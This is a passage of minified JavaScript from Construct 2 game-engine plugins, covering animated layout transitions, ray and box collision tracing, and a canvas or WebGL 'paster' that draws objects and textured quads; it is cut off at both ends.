t=cr.plugins_.hmmg_layoutTransition_v2.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime};var e=t.Instance.prototype;function i(){}function s(){}e.onCreate=function(){var t=this.properties[0]||null;null!=t&&0<t&&$("head").append("<style>.animated,animated.hinge,.animated.flipOutX,.animated.flipOutY,.animated.bounceIn,.animated.bounceOut,.animated.flipOutXX,.animated.flipInXX,.animated.flipInYY,.animated.flipOutYY{-webkit-animation-duration: "+t+"s !important;animation-duration: "+t+"s !important;}</style>")},e.onDestroy=function(){},e.saveToJSON=function(){return{}},e.loadFromJSON=function(t){},e.draw=function(t){},e.drawGL=function(t){},i.prototype.isTransitionReady=function(){return!0},i.prototype.didTransitionStart=function(){return!0},i.prototype.didTransitionFinish=function(){return!0},t.cnds=new i,s.prototype.prepareTransition=function(){var n,t,r=this.properties[1],r="rgb("+Math.floor(r/65536)+","+Math.floor(r/256)%256+","+r%256+")",e=this;n=function(){e.runtime.trigger(cr.plugins_.hmmg_layoutTransition_v2.prototype.cnds.isTransitionReady,e)},t=function(t){var e,i,s;null==$("#fakeCanvas")[0]&&(e=$("#c2canvasdiv"),i=$("<div id='fakeCanvas'><img src='"+t+"' height='"+e.height()+"' width='"+e.width()+"'/><div></div></div>"),t=$("<div id='fakeBody'></div>"),s=parseFloat(e.css("margin-left")),t.css({top:e.offset().top,left:e.offset().left,width:e.width(),height:e.height(),"background-color":r}),e.addClass("prepared").find(" > :not(canvas)").each(function(){$(this).css("left",$(this).offset().left-s+"px")}),t.appendTo(document.body).append(e).append(i),n&&n())},e.runtime.doCanvasSnapshot("image/jpeg",1),setTimeout(function(){t(e.runtime.snapshotData)},50)},s.prototype.startTransition=function(t){var e=$("#fakeBody"),i=e.find("#c2canvasdiv"),s=e.find("#fakeCanvas"),n=this;function r(){e.remove(),i.appendTo(document.body).removeClass("prepared"),n.runtime.trigger(cr.plugins_.hmmg_layoutTransition_v2.prototype.cnds.didTransitionFinish,n)}n.runtime.trigger(cr.plugins_.hmmg_layoutTransition_v2.prototype.cnds.didTransitionStart,n),14==t?(i.addClass("hidden"),s.addClass("animated rotateOut").on("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){s.addClass("hidden")}),i.removeClass("hidden").addClass("animated rotateIn").on("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){i.removeClass("animated rotateIn"),r()})):13==t?(s.addClass("animated rollOut").on("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){s.addClass("hidden")}),i.addClass("animated rollIn").on("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){i.removeClass("animated rollIn"),r()})):12==t?(s.addClass("animated zoomOut").on("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){s.addClass("hidden")}),i.addClass("animated zoomIn").on("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){i.removeClass("animated zoomIn"),r()})):11==t?(i.addClass("hidden"),s.addClass("animated fadeOut").on("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){s.addClass("hidden"),i.removeClass("hidden").addClass("animated fadeIn").on("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){i.removeClass("animated fadeIn"),r()})})):10==t?(i.addClass("hidden"),s.addClass("animated fadeOut").on("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){s.addClass("hidden")}),i.removeClass("hidden").addClass("animated fadeIn").on("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){i.removeClass("animated fadeIn"),r()})):9==t?(i.addClass("hidden"),s.addClass("animated flipOutYY").on("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){s.addClass("hidden"),i.removeClass("hidden").addClass("animated flipInYY").on("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){i.removeClass("animated flipInYY"),r()})})):8==t?(i.addClass("hidden"),s.addClass("animated flipOutXX").on("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){s.addClass("hidden"),i.removeClass("hidden").addClass("animated flipInXX").on("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){i.removeClass("animated flipInXX"),r()})})):7==t?i.addClass("animated slideInRight").on("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){r(),i.removeClass("animated slideInRight")}):6==t?i.addClass("animated slideInLeft").on("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){r(),i.removeClass("animated slideInLeft")}):5==t?i.addClass("animated slideInDown").on("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){r(),i.removeClass("animated slideInDown")}):4==t?i.addClass("animated slideInUp").on("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){r(),i.removeClass("animated slideInUp")}):3==t?(i.addClass("animated slideInRight").on("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){r(),i.removeClass("animated slideInRight"),s.removeClass("animated slideOutLeft")}),s.addClass("animated slideOutLeft")):2==t?(i.addClass("animated slideInLeft").on("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){r(),s.removeClass("animated slideOutRight"),i.removeClass("animated slideInLeft")}),s.addClass("animated slideOutRight")):1==t?(i.addClass("animated slideInDown").on("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){r(),s.removeClass("animated slideOutDown"),i.removeClass("animated slideInDown")}),s.addClass("animated slideOutDown")):0==t&&(i.addClass("animated slideInUp").on("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",function(){r(),s.removeClass("animated slideOutUp"),i.removeClass("animated slideInUp")}),s.addClass("animated slideOutUp"))},t.acts=new s,t.exps=new function(){}}(),Math.sign=Math.sign||function(t){return 0===(t=+t)||isNaN(t)?Number(t):0<t?1:-1},cr.plugins_.jcw_trace=function(t){this.runtime=t},function(){var t=cr.plugins_.jcw_trace.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){this.obstacleTypes=[]},t.Instance=function(t){this.type=t,this.runtime=t.runtime};var e=t.Instance.prototype;function i(){this.x1=0,this.y1=0,this.x2=0,this.y2=0,this.dx=0,this.dy=0,this.bounds=new cr.rect(0,0,0,0),this.t=0,this.hit=!1,this.hitx=0,this.hity=0,this.uid=-1,this.normalang=0,cr.seal(this)}var s=i.prototype;function c(t,e,i,s){var n=1/t.dx,r=1/t.dy,o=Math.sign(n),a=Math.sign(r),h=(e.left+e.right)/2,c=(e.top+e.bottom)/2,l=(e.right-e.left)/2+i,i=(e.bottom-e.top)/2+s,e=(h-o*l-t.x1)*n,s=(c-a*i-t.y1)*r,n=(h+o*l-t.x1)*n,i=(c+a*i-t.y1)*r;if(i<e||n<s)return!1;r=s<e?e:s,i=n<i?n:i;return!(r>=t.t||i<=0)&&(t.t=Math.max(r,0),t.hit=!0,t.normalang=s<e?Math.atan2(0,-o):Math.atan2(-a,0),!0)}function m(t,e,i,s,n,r,o,a){o-=n,a-=r,s=a*(i-t)-o*(s-e);return 0==s?0:((n-t)*a+(e-r)*o)/s}function l(t,e,i,s){var n,r,o,a,h,c=e.pts_cache;if(e.contains_pt(t.x1-i,t.y1-s))return t.t=0,t.hit=!0,t.normalang=Math.atan2(-t.dy,-t.dx),!0;for(var l,u,p,d=!1,g=0,f=e.pts_count;g<f;g++)p=(g+1)%f*2,r=c[u=2*g]+i,o=c[1+u]+s,a=c[p]+i,h=c[1+p]+s,cr.segments_intersect(t.x1,t.y1,t.x2,t.y2,r,o,a,h)&&(n=m(t.x1,t.y1,t.x2,t.y2,r,o,a,h))<t.t&&(d=!0,t.t=n,t.hit=!0,0==(l=t.x1,u=t.y1,0<=((p=o)-u)*(a-(u=r))-(u-l)*(h-p)?0:1)?t.normalang=Math.atan2(r-a,h-o):t.normalang=Math.atan2(a-r,o-h));return d}s.CalcHitPos=function(t){var e;this.hitx=this.x1+this.dx*this.t,this.hity=this.y1+this.dy*this.t,0!==t&&(e=Math.atan2(-this.dy,-this.dx),this.hitx+=Math.cos(e)*t,this.hity+=Math.sin(e)*t)},s.GetReflectAng=function(){return 2*this.normalang-Math.atan2(-this.dy,-this.dx)};var u=[],p=new cr.rect(0,0,0,0);function h(t,e){var i;e&&e.collisionsEnabled&&(e.update_bbox(),!e.bbox.intersects_rect(t.bounds)||(e.tilemap_exists?function(t,e){var i,s;e.getCollisionRectCandidates(t.bounds,u);for(var n=e.x,r=e.y,o=!1,a=0,h=u.length;a<h;++a)s=(i=u[a]).rc,t.bounds.intersects_rect_off(s,n,r)&&(p.copy(s),p.offset(n,r),i.poly?l(t,i.poly,p.left,p.top)&&(o=!0):c(t,p,0,0)&&(o=!0));return cr.clearArray(u),o}(t,e):e.collision_poly&&!e.collision_poly.is_empty()?((i=e.collision_poly).cache_poly(e.width,e.height,e.angle),l(t,i,e.x,e.y)):0===e.angle?c(t,e.bbox,0,0):function(t,e){var i,s,n,r,o,a,h=!1;if(e.contains_pt(t.x1,t.y1))return t.t=0,t.hit=!0,t.normalang=Math.atan2(-t.dy,-t.dx),!0;for(i=0;i<4;i++)n=e.at(i,!0),r=e.at(i,!1),o=e.at(i+1,!0),a=e.at(i+1,!1),cr.segments_intersect(t.x1,t.y1,t.x2,t.y2,n,r,o,a)&&(s=m(t.x1,t.y1,t.x2,t.y2,n,r,o,a))<t.t&&(h=!0,t.t=s,t.hit=!0,t.normalang=Math.atan2(n-o,a-r));return h}(t,e.bquad))&&(t.uid=e.uid))}function d(t,e,i,s){var n;e&&e.collisionsEnabled&&(e.update_bbox(),e.bbox.intersects_rect(t.bounds)&&(n=!1,e.tilemap_exists||(e.collision_poly&&!e.collision_poly.is_empty()?e.collision_poly.cache_poly(e.width,e.height,e.angle):0===e.angle&&(n=c(t,e.bbox,i,s))),n&&(t.uid=e.uid)))}e.onCreate=function(){this.obstacleMode=this.properties[0],this.useCollisionCells=0!==this.properties[1],this.padding=cr.clamp(this.properties[2],0,1),this.tr=new i},e.onDestroy=function(){},e.saveToJSON=function(){return{}},e.loadFromJSON=function(t){};var g=[];function n(){}function r(){}function o(){}e.GetOverlapCandidates=function(){var t,e,i,s=this.tr;if(0===this.obstacleMode)this.useCollisionCells?this.runtime.getSolidCollisionCandidates(null,s.bounds,g):(i=this.runtime.getSolidBehavior())&&cr.appendArray(g,i.my_instances.valuesRef());else if(this.useCollisionCells)this.runtime.getTypesCollisionCandidates(null,this.type.obstacleTypes,s.bounds,g);else for(t=0,e=this.type.obstacleTypes.length;t<e;++t)cr.appendArray(g,this.type.obstacleTypes[t].instances)},n.prototype.Hit=function(){return this.tr.hit},t.cnds=new n,r.prototype.AddObstacle=function(t){var e=this.type.obstacleTypes;if(-1===e.indexOf(t)){for(var i,s=0,n=e.length;s<n;s++)if((i=e[s]).is_family&&-1!==i.members.indexOf(t))return;e.push(t)}},r.prototype.ClearObstacles=function(){cr.clearArray(this.type.obstacleTypes)},r.prototype.TraceLine=function(t,e,i,s){var n,r,o,a=this.tr;if(a.x1=t,a.y1=e,a.x2=i,a.y2=s,a.dx=i-t,a.dy=s-e,a.bounds.set(t,e,i,s),a.bounds.normalize(),a.t=1,a.hit=!1,this.GetOverlapCandidates(),0===this.obstacleMode)for(n=0,r=g.length;n<r;++n)(o=g[n]).extra.solidEnabled&&h(a,o);else for(n=0,r=g.length;n<r;++n)h(a,o=g[n]);cr.clearArray(g),a.hit?a.CalcHitPos(this.padding):(a.hitx=i,a.hity=s,a.uid=-1,a.normalang=Math.atan2(-a.dy,-a.dx))},r.prototype.TraceBox=function(t,e,i,s,n,r){var o,a,h,c=n/2,l=r/2,u=this.tr;if(u.x1=t,u.y1=e,u.x2=i,u.y2=s,u.dx=i-t,u.dy=s-e,u.bounds.set(t,e,i,s),u.bounds.normalize(),u.bounds.left-=c,u.bounds.right+=c,u.bounds.top-=l,u.bounds.bottom+=l,u.t=1,u.hit=!1,this.GetOverlapCandidates(),0===this.obstacleMode)for(o=0,a=g.length;o<a;++o)(h=g[o]).extra.solidEnabled&&d(u,h,c,l);else for(o=0,a=g.length;o<a;++o)d(u,h=g[o],c,l);cr.clearArray(g),u.hit?u.CalcHitPos(this.padding):(u.hitx=i,u.hity=s,u.uid=-1,u.normalang=Math.atan2(-u.dy,-u.dx))},t.acts=new r,o.prototype.HitUID=function(t){t.set_int(this.tr.uid)},o.prototype.HitX=function(t){t.set_float(this.tr.hitx)},o.prototype.HitY=function(t){t.set_float(this.tr.hity)},o.prototype.NormalAngle=function(t){t.set_float(cr.to_degrees(this.tr.normalang))},o.prototype.ReflectAngle=function(t){t.set_float(cr.to_degrees(this.tr.GetReflectAng()))},o.prototype.HitFrac=function(t){t.set_float(this.tr.t)},t.exps=new o}(),cr.plugins_.rojoPaster=function(t){this.runtime=t},function(){var t=cr.plugins_.rojoPaster.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime};var e=t.Instance.prototype;function i(){}function C(t,e,i){for(var s=[[0,1,2],[2,3,0]],n=0;n<2;n++){var r=s[n],o=i[r[0]].x,a=i[r[1]].x,h=i[r[2]].x,c=i[r[0]].y,l=i[r[1]].y,u=i[r[2]].y,p=i[r[0]].u,d=i[r[1]].u,g=i[r[2]].u,f=i[r[0]].v,m=i[r[1]].v,y=i[r[2]].v;t.save(),t.beginPath(),t.moveTo(o,c),t.lineTo(a,l),t.lineTo(h,u),t.closePath(),t.clip();var _=p*m+f*g+d*y-m*g-f*d-p*y,v=o*m+f*h+a*y-m*h-f*a-o*y,r=p*a+o*g+d*h-a*g-o*d-p*h,o=p*m*h+f*a*g+o*d*y-o*m*g-f*d*h-p*a*y,h=c*m+f*u+l*y-m*u-f*l-c*y,a=p*l+c*g+d*u-l*g-c*d-p*u,y=p*m*u+f*l*g+c*d*y-c*m*g-f*d*u-p*l*y;t.transform(v/_,h/_,r/_,a/_,o/_,y/_),t.drawImage(e,0,0),t.restore()}}function s(){}e.onCreate=function(){this.visible=0===this.properties[0],this.resx=this.width,this.resy=this.height,this.verts=[{x:0,y:0,u:0,v:0},{x:0,y:0,u:0,v:0},{x:0,y:0,u:0,v:0},{x:0,y:0,u:0,v:0}],this.points=null,this.canvas2textureNextTick=0;var t=this.runtime.glwrap;t?(this.texture=t.createEmptyTexture(this.resx,this.resy,this.runtime.linearSampling,!1),this.temp_texture=t.createEmptyTexture(this.resx,this.resy,this.runtime.linearSampling,!1),this.quadtex=t.createEmptyTexture(1,1,this.runtime.linearSampling,!1),t.setTexture(null),t.setRenderingToTexture(this.quadtex),t.clear(0,0,0,1),t.setRenderingToTexture(null),this.quadblend=new Object,this.quadblend.srcBlend=t.gl.ONE,this.quadblend.destBlend=t.gl.ONE_MINUS_SRC_ALPHA):(this.canvas=document.createElement("canvas"),this.canvas.width=this.resx,this.canvas.height=this.resy,this.ctx=this.canvas.getContext("2d"),this.runtime.linearSampling||(this.ctx.mozImageSmoothingEnabled=!1,this.ctx.webkitImageSmoothingEnabled=!1,this.ctx.msImageSmoothingEnabled=!1,this.ctx.imageSmoothingEnabled=!1),this.fill="black")},e.onDestroy=function(){this.texture&&(this.runtime.glwrap.deleteTexture(this.texture),this.runtime.glwrap.deleteTexture(this.quadtex),this.runtime.glwrap.deleteTexture(this.temp_texture)),this.texture=null,this.quadtex=null,this.temp_texture=null,this.canvas=null,this.ctx=null},e.saveToJSON=function(){return{}},e.loadFromJSON=function(t){},e.grabCanvas=function(){var t,e,i,s=this.runtime.glwrap,n=this.runtime.canvas;s?(null==this.type.plugin.canvasflip&&((e=document.createElement("canvas")).width=1,e.height=2,(i=e.getContext("experimental-webgl")).clearColor(1,1,1,1),i.clear(i.COLOR_BUFFER_BIT),t=i.createProgram(),e=i.createShader(i.VERTEX_SHADER),i.shaderSource(e,"attribute vec3 pos;void main() {gl_Position = vec4(pos, 1.0);}"),i.compileShader(e),i.attachShader(t,e),e=i.createShader(i.FRAGMENT_SHADER),i.shaderSource(e,"void main() {gl_FragColor = vec4(0.0, 0.0, 0.0, 1.0);}"),i.compileShader(e),i.attachShader(t,e),i.linkProgram(t),i.useProgram(t),i.bindBuffer(i.ARRAY_BUFFER,i.createBuffer()),i.bufferData(i.ARRAY_BUFFER,new Float32Array([-1,-1,0,1,-1,0,-1,0,0,1,0,0]),i.STATIC_DRAW),e=i.getAttribLocation(t,"pos"),i.enableVertexAttribArray(e),i.vertexAttribPointer(e,3,i.FLOAT,!1,0,0),i.drawArrays(i.TRIANGLE_STRIP,0,4),t=i.createTexture(),i.bindTexture(i.TEXTURE_2D,t),i.texImage2D(i.TEXTURE_2D,0,i.RGBA,i.RGBA,i.UNSIGNED_BYTE,i.canvas),i.bindTexture(i.TEXTURE_2D,null),e=i.createFramebuffer(),i.bindFramebuffer(i.FRAMEBUFFER,e),i.framebufferTexture2D(i.FRAMEBUFFER,i.COLOR_ATTACHMENT0,i.TEXTURE_2D,t,0),e=new Uint8Array(8),i.readPixels(0,0,1,2,i.RGBA,i.UNSIGNED_BYTE,e),i.bindFramebuffer(i.FRAMEBUFFER,null),this.type.plugin.canvasflip=0==e[0],i.deleteTexture(t)),i=s.gl,this.texture.c2width==n.width&&this.texture.c2height==n.height||(s.deleteTexture(this.texture),this.texture=null),null==this.texture&&(this.texture=s.createEmptyTexture(n.width,n.height,this.runtime.linearSampling,this.runtime.isMobile)),this.type.plugin.canvasflip&&s.gl.pixelStorei(s.gl.UNPACK_FLIP_Y_WEBGL,!0),s.videoToTexture(n,this.texture,this.runtime.isMobile),s.gl.pixelStorei(s.gl.UNPACK_FLIP_Y_WEBGL,!1)):(this.canvas.width=n.width,this.canvas.height=n.height,this.ctx.drawImage(n,0,0,n.width,n.height))},e.draw=function(t){t.globalAlpha=this.opacity,t.save(),t.translate(this.x,this.y);var e=0<this.width?1:-1,i=0<this.height?1:-1;1==e&&1==i||t.scale(e,i),t.rotate(this.angle*e*i),t.drawImage(this.canvas,0-this.hotspotX*cr.abs(this.width),0-this.hotspotY*cr.abs(this.height),cr.abs(this.width),cr.abs(this.height)),t.restore()},e.drawGL=function(t){t.setTexture(this.texture),t.setOpacity(this.opacity);var e=this.bquad;t.quad(e.tlx,e.tly,e.trx,e.try_,e.brx,e.bry,e.blx,e.bly)},t.cnds=new function(){},i.prototype.SetEffect=function(t){this.compositeOp=cr.effectToCompositeOp(t),cr.setGLBlend(this,t,this.runtime.gl),this.runtime.redraw=!0},i.prototype.PasteObject=function(t){var e,i=t.getCurrentSol(),s=(i.select_all?i.type:i).instances;this.update_bbox();var n=this.runtime.glwrap;if(n){if(!this.texture)return;t=n.width,i=n.height;n.setSize(this.resx,this.resy),n.setTexture(null),n.setRenderingToTexture(this.texture),n.resetModelView(),n.scale(this.resx/this.width,-this.resy/this.height),n.rotateZ(-this.angle),n.translate((this.bbox.left+this.bbox.right)/-2,(this.bbox.top+this.bbox.bottom)/-2),n.updateModelView();for(var r,o,a,h,c=0,l=s.length;c<l;c++)if(e=s[c],this!=e&&e.visible&&0!==e.width&&0!==e.height&&(e.update_bbox(),this.bbox.intersects_rect(e.bbox)))if(e.uses_shaders)for(a=0,h=e.active_effect_types.length;a<h;++a)n.setTexture(null),n.setRenderingToTexture(this.temp_texture),n.clear(0,0,0,0),r=e.active_effect_types[a].shaderindex,o=e.active_effect_types[a].index,n.switchProgram(r),n.setBlend(e.srcBlend,e.destBlend),n.setProgramParameters(this.temp_texture,1/e.width,1/e.height,0,1,1,0,1,0,0,0,.5,.5,this.runtime.kahanTime.sum,e.effect_params[o]),e.drawGL(n),n.switchProgram(0),n.setTexture(null),n.setRenderingToTexture(this.texture),n.setTexture(this.temp_texture),n.resetModelView(),n.scale(this.resx,-this.resy),n.translate(-.5,-.5),n.updateModelView(),n.setOpacity(e.opacity),n.setAlphaBlend(),n.quad(0,0,1,0,1,1,0,1),n.resetModelView(),n.scale(this.resx/this.width,-this.resy/this.height),n.rotateZ(-this.angle),n.translate((this.bbox.left+this.bbox.right)/-2,(this.bbox.top+this.bbox.bottom)/-2),n.updateModelView();else n.switchProgram(0),n.setBlend(e.srcBlend,e.destBlend),e.drawGL(n);n.setRenderingToTexture(null),n.setSize(t,i)}else{var u=this.ctx;for(c=0,l=s.length;c<l;c++)(e=s[c]).update_bbox(),0==e.visible&&0==this.runtime.testOverlap(this,e)||(u.save(),u.scale(this.canvas.width/this.width,this.canvas.height/this.height),u.rotate(-this.angle),u.translate(-this.bquad.tlx,-this.bquad.tly),u.globalCompositeOperation=e.compositeOp,e.draw(u),u.restore())}this.runtime.redraw=!0},i.prototype.ClearColor=function(t,e,i,s){t=cr.clamp(t,0,255),e=cr.clamp(e,0,255),i=cr.clamp(i,0,255),s=cr.clamp(s,0,100);var n=this.runtime.glwrap;n?(n.setTexture(null),n.setRenderingToTexture(this.texture),n.clear(t/255,e/255,i/255,s/100),n.setRenderingToTexture(null)):(this.ctx.fillStyle="rgba("+parseInt(t)+","+parseInt(e)+","+parseInt(i)+","+s/100+")",this.ctx.clearRect(0,0,this.canvas.width,this.canvas.height),this.ctx.fillRect(0,0,this.canvas.width,this.canvas.height)),this.runtime.redraw=!0},i.prototype.SetResolution=function(t,e){this.resx=t,this.resy=e;var i=this.runtime.glwrap;i?(this.texture&&(i.deleteTexture(this.texture),i.deleteTexture(this.temp_texture)),this.texture=i.createEmptyTexture(t,e,this.runtime.linearSampling,!1),this.temp_texture=i.createEmptyTexture(t,e,this.runtime.linearSampling,!1)):(this.canvas.width=t,this.canvas.height=e),this.runtime.redraw=!0},i.prototype.QuadColor=function(t,e,i,s){t=cr.clamp(t,0,255),e=cr.clamp(e,0,255),i=cr.clamp(i,0,255),s=cr.clamp(s,0,100);var n=this.runtime.glwrap;n?(n.setTexture(null),n.setRenderingToTexture(this.quadtex),n.clear(t/255,e/255,i/255,s/100),n.setRenderingToTexture(null)):this.fill="rgba("+parseInt(t)+","+parseInt(e)+","+parseInt(i)+","+s/100+")"},i.prototype.DrawQuad=function(t,e,i,s,n,r,o,a,h){this.update_bbox();var c,l,u=this.runtime.glwrap;u?(u.setTexture(null),u.setRenderingToTexture(this.texture),c=u.width,l=u.height,u.setSize(this.resx,this.resy),u.resetModelView(),u.scale(this.resx/this.width,-this.resy/this.height),u.rotateZ(-this.angle),u.translate((this.bbox.left+this.bbox.right)/-2,(this.bbox.top+this.bbox.bottom)/-2),u.updateModelView(),u.setTexture(this.quadtex),u.setOpacity(1),cr.setGLBlend(this.quadblend,h,u.gl),u.setBlend(this.quadblend.srcBlend,this.quadblend.destBlend),u.quad(t,e,i,s,n,r,o,a),u.setRenderingToTexture(null),u.setSize(c,l)):((l=this.ctx).save(),l.scale(this.canvas.width/this.width,this.canvas.height/this.height),l.rotate(-this.angle),l.translate(-this.bquad.tlx,-this.bquad.tly),l.globalCompositeOperation=cr.effectToCompositeOp(h),l.globalAlpha=1,l.fillStyle=this.fill,l.beginPath(),l.moveTo(t,e),l.lineTo(i,s),l.lineTo(n,r),l.lineTo(o,a),l.closePath(),l.fill(),l.restore()),this.runtime.redraw=!0},i.prototype.DrawTexQuad=function(t,e,i,s,n,r,o,a,h,c,l){var u,p,d,g,f,m=l.getFirstPicked();m&&(d=p=null,(u=m.curFrame)||(m.canvas&&(p=m.canvas),m.tex&&(d=m.tex),m.texture&&(d=m.texture),m.texture_img&&(p=m.texture_img,d=m.webGL_texture)),this.update_bbox(),(l=this.runtime.glwrap)&&(u||d)?(l.setTexture(null),l.setRenderingToTexture(this.texture),f=l.width,g=l.height,l.setSize(this.resx,this.resy),l.resetModelView(),l.scale(this.resx/this.width,-this.resy/this.height),l.rotateZ(-this.angle),l.translate((this.bbox.left+this.bbox.right)/-2,(this.bbox.top+this.bbox.bottom)/-2),l.updateModelView(),l.setOpacity(c/100),cr.setGLBlend(this.quadblend,h,l.gl),l.setBlend(this.quadblend.srcBlend,this.quadblend.destBlend),u?(l.setTexture(m.curWebGLTexture),u.spritesheeted?l.quadTex(t,e,i,s,n,r,o,a,u.sheetTex):l.quad(t,e,i,s,n,r,o,a)):(l.setTexture(d),l.quad(t,e,i,s,n,r,o,a)),l.setRenderingToTexture(null),l.setSize(f,g)):(u||p)&&(f=null,(g=this.ctx).save(),g.scale(this.canvas.width/this.width,this.canvas.height/this.height),g.rotate(-this.angle),g.translate(-this.bquad.tlx,-this.bquad.tly),g.globalCompositeOperation=cr.effectToCompositeOp(h),g.globalAlpha=c/100,this.points||(this.points=[new Object,new Object,new Object,new Object]),f=u?u.texture_img:p,u&&u.spritesheeted?(this.points[0].x=t,this.points[0].y=e,this.points[0].u=u.offx,this.points[0].v=u.offy,this.points[1].x=i,this.points[1].y=s,this.points[1].u=u.offx+u.width,this.points[1].v=u.offy,this.points[2].x=n,this.points[2].y=r,this.points[2].u=u.offx+u.width,this.points[2].v=u.offy+u.height,this.points[3].x=o,this.points[3].y=a,this.points[3].u=u.offx,this.points[3].v=u.offy+u.height):(this.points[0].x=t,this.points[0].y=e,this.points[0].u=0,this.points[0].v=0,this.points[1].x=i,this.points[1].y=s,this.points[1].u=f.width,this.points[1].v=0,this.points[2].x=n,this.points[2].y=r,this.points[2].u=f.width,this.points[2].v=f.height,this.points[3].x=o,this.points[3].y=a,this.points[3].u=0,this.points[3].v=f.height),C(g,f,this.points),g.restore()),this.runtime.redraw=!0)},i.prototype.setVertice=function(t,e,i,s,n){(t|=0)<0||3<t||(this.verts[t].x=e,this.verts[t].y=i,this.verts[t].u=s,this.verts[t].v=n)},i.prototype.DrawSubTexQuad=function(t,e,i){var s,n,r,o,a,h,c,l,u,p,d,g,f,m,y,_,v,b,w,x,S,T=i.getFirstPicked();T&&(s=this.verts[0].x,n=this.verts[0].y,r=this.verts[0].u,o=this.verts[0].v,a=this.verts[1].x,h=this.verts[1].y,c=this.verts[1].u,l=this.verts[1].v,u=this.verts[2].x,p=this.verts[2].y,d=this.verts[2].u,g=this.verts[2].v,f=this.verts[3].x,m=this.verts[3].y,y=this.verts[3].u,_=this.verts[3].v,w=b=null,(v=T.curFrame)||(T.canvas&&(b=T.canvas),T.tex&&(w=T.tex),T.texture&&(w=T.texture),T.texture_img&&(b=T.texture_img,w=T.webGL_texture)),this.update_bbox(),(i=this.runtime.glwrap)&&(v||w)?(i.setTexture(null),i.setRenderingToTexture(this.texture),S=i.width,x=i.height,i.setSize(this.resx,this.resy),i.resetModelView(),i.scale(this.resx/this.width,-this.resy/this.height),i.rotateZ(-this.angle),i.translate((this.bbox.left+this.bbox.right)/-2,(this.bbox.top+this.bbox.bottom)/-2),i.updateModelView(),i.setOpacity(e/100),cr.setGLBlend(this.quadblend,t,i.gl),i.setBlend(this.quadblend.srcBlend,this.quadblend.destBlend),v?(i.setTexture(T.curWebGLTexture),v.spritesheeted?((T=v.sheetTex).width=T.right-T.left,T.height=T.bottom-T.top,i.quadTexUV(s,n,a,h,u,p,f,m,T.left+r*T.width,T.top+o*T.height,T.left+c*T.width,T.top+l*T.height,T.left+d*T.width,T.top+g*T.height,T.left+y*T.width,T.top+_*T.height)):i.quadTexUV(s,n,a,h,u,p,f,m,r,o,c,l,d,g,y,_)):(i.setTexture(w),i.quadTexUV(s,n,a,h,u,p,f,m,r,o,c,l,d,g,y,_)),i.setRenderingToTexture(null),i.setSize(S,x)):(v||b)&&(S=null,(x=this.ctx).save(),x.scale(this.canvas.width/this.width,this.canvas.height/this.height),x.rotate(-this.angle),x.translate(-this.bquad.tlx,-this.bquad.tly),x.globalCompositeOperation=cr.effectToCompositeOp(t),x.globalAlpha=e/100,this.points||(this.points=[new Object,new Object,new Object,new Object]),S=v?v.texture_img:b,v&&v.spritesheeted?(this.points[0].x=s,this.points[0].y=n,this.points[0].u=v.offx+r*v.width,this.points[0].v=v.offy+o*v.height,this.points[1].x=a,this.points[1].y=h,this.points[1].u=v.offx+c*v.width,this.points[1].v=v.offy+l*v.height,this.points[2].x=u,this.points[2].y=p,this.points[2].u=v.offx+d*v.width,this.points[2].v=v.offy+g*v.height,this.points[3].x=f,this.points[3].y=m,this.points[3].u=v.offx+y*v.width,this.points[3].v=v.offy+_*v.height):(this.points[0].x=s,this.points[0].y=n,this.points[0].u=r*S.width,this.points[0].v=o*S.height,this.points[1].x=a,this.points[1].y=h,this.points[1].u=c*S.width,this.points[1].v=l*S.height,this.points[2].x=u,this.points[2].y=p,this.points[2].u=d*S.width,this.points[2].v=g*S.height,this.points[3].x=f,this.points[3].y=m,this.points[3].u=y*S.width,this.points[3].v=_*S.height),C(x,S,this.points),x.restore()),this.runtime.redraw=!0)},i.prototype.LoadImage=function(t,e){var i=this,s=new Image;s.onload=function(){i.resx=s.width,i.resy=s.height;var t=i.runtime.glwrap;t?(t.deleteTexture(this.texture),t.deleteTexture(this.temp_texture),i.texture=t.loadTexture(s,!1,i.runtime.linearSampling)):(i.canvas.width=s.width,i.canvas.height=s.height,i.ctx.drawImage(s,0,0,s.width,s.height)),0===e&&(i.width=s.width,i.height=s.height,i.set_bbox_changed()),i.runtime.redraw=!0},"data:"!==t.substr(0,5)&&(s.crossOrigin="anonymous"),s.src=t},i.prototype.LoadCanvas=function(){this.grabCanvas(),this.runtime.redraw=!0},t.acts=new i,s.prototype.imageUrl=function(t){var e=this.runtime.glwrap;if(e){var 